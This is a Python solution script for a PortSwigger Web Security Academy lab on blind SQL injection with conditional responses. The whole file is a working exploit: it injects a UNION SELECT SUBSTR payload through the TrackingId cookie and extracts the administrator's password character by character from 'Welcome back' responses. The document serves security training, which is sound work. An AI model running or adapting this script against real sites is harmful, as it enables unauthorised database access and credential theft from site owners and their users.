### A first solution for web security academy- 'Blind SQL injection with conditional responses'
### More info: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

### For each character position in admin password, check if character is equal to character
####### If character in position == character, add character to inferred password and increment pw character position
### Usage: python3 blind_sql_conditional_resp.py 'url'

import requests
import string
import sys

#url = 'https://ac881f961ff1891a80a8e3b900fa0027.web-security-academy.net/'
url = sys.argv[1]

r = requests.get(url)

cookies = dict(session=r.cookies['session'], TrackingId="")

r = requests.get(url, cookies=cookies)

ASCII = string.printable
ASCII = ASCII.replace("\n", "").replace("\r", "").replace("%","").replace(";","") # Web page will return 'welcome back' if checking for ';' when substring > password length
inferred_password = ""

for i in range(0, 32): # Assuming password can be max 32 characters
    print("password character", i+1)
    for j in range(len(ASCII)):
        print(ASCII[j])
        query = f"xyz' UNION SELECT 'a' FROM users WHERE username = 'administrator' and SUBSTR(password, {i+1}, 1) = '{ASCII[j]}'-- " # STR/SUBSTR starts at position 1
        print(query)
        cookies.update(TrackingId=query)
        r = requests.get(url, cookies=cookies)
        if "Welcome back" in r.text:
            inferred_password = inferred_password + ASCII[j]
            print("Inferred_password:", inferred_password)
            break
    if len(inferred_password) != i+1:
        break
print(inferred_password)

